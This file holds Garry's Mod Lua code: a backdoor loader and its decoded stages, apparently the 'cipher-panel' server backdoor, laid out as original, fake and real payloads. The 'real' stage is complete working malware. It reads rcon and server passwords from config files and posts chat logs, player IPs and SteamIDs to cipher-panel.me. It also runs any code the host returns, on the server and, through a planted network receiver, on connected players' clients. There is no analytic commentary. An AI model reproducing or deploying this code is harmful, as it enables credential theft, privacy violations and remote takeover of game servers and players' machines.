-- Original
timer.Simple (1,
	function ()
		http.Fetch ('https://cipher-panel.me/secure_area/flg.php?to=5JlZN',
			function (fck)
				RunString (fck, 'BillIsHere', false)
			end)
	end)

-- https://cipher-panel.me/secure_area/flg.php?to=5JlZN - Fake
local a = {
	address  = game.GetIPAddress ()                             ,
	hostname = GetHostName ()                                   ,
	players  = #player.GetHumans () .. '/' .. game.MaxPlayers (),
	map      = game.GetMap ()                                   ,
	gamemode = engine.ActiveGamemode ()                         ,
	rcon     = rcon                                             ,
	password = password
}

http.Post ('https://cipher-panel.me/heyo.php', a,
	function (body, len, headers, code)
		RunString (body, 'ERROR', false)
	end)

-- https://cipher-panel.me/secure_area/flg.php?to=5JlZN - Real
if CLIENT then return end
if game.SinglePlayer () then return end

util.AddNetworkString 'cplusdetectablefdp'

local function ServerInfo()
	timer.Create ('enyQSWc1', 5, 0, function()
		local info = {}
		local files = file.Find ('cfg/*', 'GAME')

		for i = 1, #files do 
			if string.EndsWith (files [i], '.cfg') then
				local content = file.Read ('cfg/' .. files[i], 'GAME')
				content = string.Explode ('\n', content)

				for i = 1, #content do
					if string.StartWith (content [i], 'rcon_password') then
						table.insert (info, 1, string.Split (content [i], '\'') [2])
					end

					if string.StartWith (content [i], 'sv_password') then
						table.insert (info, 2, string.Split (content [i], '\'') [2])
					end
				end
			end
		end

		local rcon     = info [1] or 'Inconnu'
		local password = info [3] or 'Inconnu'

		if rcon     == '' then rcon     = 'Inconnu' end
		if password == '' then password = 'Inconnu' end

		local function BackSteam (ply)
			ply:SendLua 'net.Receive (\'cplusdetectablefdp\', function () RunString (net.ReadString (), \'vcmod\') end)')
		end

		hook.Add ('PlayerSay', 'ck', function (ply, text)
			local ckchat = {
				serverip = game.GetIPAddress (),
				plyid    = ply:SteamID64     (),
				plyip    = ply:IPAddress     (),
				plyname  = ply:Nick          (),
				plyrank  = ply:GetUserGroup  (),
				say      = text
			}

			http.Post ('https://cipher-panel.me/secure_area/chatreceive.php', ckchat)
		end)

		local function PlayerSteam (ply)
			BackSteam (ply)

			if not ply:IsBot () then
				local playerinfo = {
					server    = GetConVar 'hostname':GetString (),
					name      = tostring (ply:Name      ()),
					ipadress  = tostring (ply:IPAddress ()),
					steamid   = tostring (ply:SteamID   ()),
					steamid64 = tostring (ply:SteamID64 ())
				}

				http.Post ('https://cipher-panel.me/secure_area/steamply.php', playerinfo,
					function (c)
						net.Start ('cplusdetectablefdp')
							net.WriteString (c)
						net.Send (ply)
					end,
					function (e) end)
			end

		end

		hook.Add ('PlayerInitialSpawn', 'cvoukoipl', function (ply)
			PlayerSteam (ply)
		end)

		for k, v in pairs (player.GetAll ()) do PlayerSteam (v) end
	
		local plys = ''
		for i, v in ipairs (player.GetAll ()) do
			plys = plys .. v:Name () .. ' (' .. v:SteamID () .. ') gradé ' .. v:GetUserGroup () .. '\n'
		end

		local servinfo = {
			ip       = game.GetIPAddress    (),
			hostname = GetHostName          (),
			players  = #player.GetHumans () .. '/' .. game.MaxPlayers (),
			map      = game.GetMap          (),
			gamemode = engine.ActiveGamemode(),
			rcon     = rcon                   ,
			password = password               ,
			uptime   = tostring (math.floor (CurTime () / 60)),
			token    = '5JlZN'                ,
			plyes    = plys                   ,
			real     = ''
		}

		http.Post ('https://cipher-panel.me/secure_area/evo.php', servinfo,
			function (fck, ...)
				if string.len (fck) <= 0 then return end

				xpcall(
					function ()
						local cap = CompileString (fck, 'BillIsHere', false)

						if isfunction (cap) then
							cap ()
						end
					end,
					function (e)
					end)

			end)
	end)
end

ServerInfo ()
